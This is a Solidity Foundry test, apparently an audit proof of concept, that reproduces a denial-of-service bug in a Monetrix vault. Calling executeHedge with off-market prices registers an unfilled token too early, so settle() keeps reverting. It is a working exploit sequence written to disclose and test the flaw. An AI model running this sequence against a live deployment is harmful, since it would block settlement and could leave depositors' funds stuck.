// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ATTACK TIMELINE:
// 1. [Setup] SimulatorBase deploys full protocol; deposit USDC into vault, enable pmEnabled
// 2. [T=0] Governor enables pmEnabled on vault so executeHedge will call notifyVaultSupply
// 3. [T=1] Operator calls executeHedge with off-market limit prices (orders won't fill)
// 4. [T=2] executeHedge places limit orders AND prematurely calls notifyVaultSupply(spotToken, perpIndex)
// 5. [T=3] vaultSupplied array now contains a token that hasn't actually been supplied to 0x811 precompile
// 6. [T=4] Operator calls settle() which calls totalBackingSigned() -> iterates vaultSupplied
// 7. [T=5] PrecompileReader.suppliedBalance() fails strict length check for unfilled token -> REVERT
// 8. [Assert] settle() reverts, proving DoS of settlement pipeline

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/ActionEncoder.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixConfig.sol";

contract AuditAgentPoC is SimulatorBase {

    function test_prematureNotifyVaultSupply_DoS_settle() public {
        // === Step 1: Setup - deposit funds into vault ===
        _deposit(address(this), 10_000_000e6);
        console.log("Step 1: Deposited 10M USDC into vault");

        // === Step 2: Enable pmEnabled so executeHedge calls notifyVaultSupply ===
        vm.prank(governor);
        vault.setPmEnabled(true);
        assertTrue(vault.pmEnabled(), "pmEnabled should be true");
        console.log("Step 2: pmEnabled set to true");

        // === Step 3: Record vaultSupplied length before attack ===
        uint256 vaultSuppliedBefore = accountant.vaultSuppliedLength();
        console.log("Step 3: vaultSuppliedLength before =", vaultSuppliedBefore);

        // === Step 4: Operator calls executeHedge with off-market prices ===
        // Using extremely off-market prices so limit orders will NOT fill
        // This simulates thin liquidity / off-market pricing scenario
        ActionEncoder.HedgeParams memory hedgeParams = ActionEncoder.HedgeParams({
            perpAsset: 1,
            spotAsset: 1,
            size: 100_000e6,
            perpPrice: 999_999e6,   // absurdly high - order won't fill
            spotPrice: 999_999e6,   // absurdly high - order won't fill
            cloid: bytes16(uint128(1))
        });

        vm.prank(operator);
        vault.executeHedge(1, hedgeParams);
        console.log("Step 4: executeHedge called with off-market prices");

        // === Step 5: Verify premature registration occurred ===
        uint256 vaultSuppliedAfter = accountant.vaultSuppliedLength();
        console.log("Step 5: vaultSuppliedLength after =", vaultSuppliedAfter);
        assertGt(
            vaultSuppliedAfter,
            vaultSuppliedBefore,
            "BUG: Token registered in vaultSupplied before limit order filled"
        );

        // === Step 6: Attempt to call settle() - should revert ===
        // settle() -> totalBackingSigned() -> _readL1Backing() -> iterates vaultSupplied
        // -> PrecompileReader.suppliedBalance() fails for unfilled token -> REVERT
        vm.prank(operator);
        vm.expectRevert();
        vault.settle(0);
        console.log("Step 6: settle() REVERTED - DoS confirmed");

        // === Step 7: Verify the DoS persists - second attempt also reverts ===
        vm.prank(operator);
        vm.expectRevert();
        vault.settle(0);
        console.log("Step 7: Second settle() attempt also REVERTED - persistent DoS");

        // === Final assertion: settlement pipeline is completely blocked ===
        // The premature registration in vaultSupplied cannot be resolved
        // without operator manually calling removeSuppliedEntry or orders filling
        assertGt(
            accountant.vaultSuppliedLength(),
            vaultSuppliedBefore,
            "Premature entry still exists - settlement permanently DoS'd until manual intervention"
        );
    }
}
